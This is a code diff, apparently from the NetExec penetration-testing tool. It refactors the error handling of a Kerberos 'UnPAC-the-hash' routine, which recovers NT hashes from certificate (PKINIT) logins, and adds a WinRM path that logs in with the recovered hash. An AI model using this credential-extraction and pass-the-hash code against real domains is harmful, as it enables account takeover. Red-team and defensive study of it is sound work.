@@ -83,7 +83,8 @@ def unpac_the_hash(connection, username, tgt, cipher, reply_key, session_key):
     """Recover the NT hash of the account the TGT belongs to, through a U2U service ticket to itself
 
     Only a PKINIT AS-REP carries a PAC_CREDENTIAL_INFO, and the KDC encrypts it with the AS reply key,
-    which the TGT does not expose: it has to be read from a ticket requested with that very TGT
+    which the TGT does not expose: it has to be read from a ticket requested with that very TGT.
+    Returns None, after logging why, when the hash cannot be recovered
     """
     decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]
     ticket = Ticket()
@@ -130,13 +131,16 @@ def unpac_the_hash(connection, username, tgt, cipher, reply_key, session_key):
     seq_set_iter(req_body, "additional-tickets", (ticket.to_asn1(TicketAsn1()),))
 
     connection.logger.info("Requesting a U2U service ticket to ourselves to read the PAC")
-    response = sendReceive(encoder.encode(tgs_req), connection.domain, connection.kdcHost)
-    tgs_rep = decoder.decode(response, asn1Spec=TGS_REP())[0]
-    connection.logger.debug(f"U2U TGS-REP: {tgs_rep.prettyPrint()}")
-
-    # Key usage 2: with enc-tkt-in-skey the ticket is encrypted with the session key of the TGT sent along
-    enc_ticket_part = cipher.decrypt(session_key, 2, tgs_rep["ticket"]["enc-part"]["cipher"])
-    return read_nt_hash_from_pac(connection, enc_ticket_part, reply_key)
+    try:
+        response = sendReceive(encoder.encode(tgs_req), connection.domain, connection.kdcHost)
+        tgs_rep = decoder.decode(response, asn1Spec=TGS_REP())[0]
+        connection.logger.debug(f"U2U TGS-REP: {tgs_rep.prettyPrint()}")
+        # Key usage 2: with enc-tkt-in-skey the ticket is encrypted with the session key of the TGT sent along
+        enc_ticket_part = cipher.decrypt(session_key, 2, tgs_rep["ticket"]["enc-part"]["cipher"])
+        return read_nt_hash_from_pac(connection, enc_ticket_part, reply_key)
+    except (KerberosError, InvalidChecksum, PyAsn1Error, OSError, IndexError, KeyError) as e:   # IndexError: empty AD-IF-RELEVANT, KeyError: unknown etype
+        connection.logger.fail(f"Failed to unPAC the hash: {e}")
+        return None
 
 
 def pfx_auth(self):
@@ -175,17 +179,17 @@ def pfx_auth(self):
     ccache.saveFile(ccache_path)
     self.logger.info(f"Saved TGT to {ccache_path}")
 
+    if self.protocol == "winrm":   # nxc winrm has no Kerberos login: log in over NTLM with the unPACed hash, as before
+        nthash = unpac_the_hash(self, username, tgt, cipher, reply_key, session_key)
+        return bool(nthash) and self.hash_login(self.domain, username, nthash)
+
     # Impacket reads the TGT of a Kerberos login from the cache this variable points at, for the whole process
     os.environ["KRB5CCNAME"] = ccache_path
     self.use_kcache = True
     logged_in = self.kerberos_login(self.domain, username, "", "", "", self.kdcHost, True)
 
     if self.unpac:
-        try:
-            nthash = unpac_the_hash(self, username, tgt, cipher, reply_key, session_key)
-        except (KerberosError, InvalidChecksum, PyAsn1Error, OSError, IndexError, KeyError) as e:   # IndexError: empty AD-IF-RELEVANT, KeyError: unknown etype
-            self.logger.fail(f"Failed to unPAC the hash: {e}")
-            return logged_in
+        nthash = unpac_the_hash(self, username, tgt, cipher, reply_key, session_key)
         if nthash:
             self.logger.highlight(f"{self.domain}\\{username} NT hash: {nthash}")
             self.db.add_credential("hash", self.domain, username, nthash)
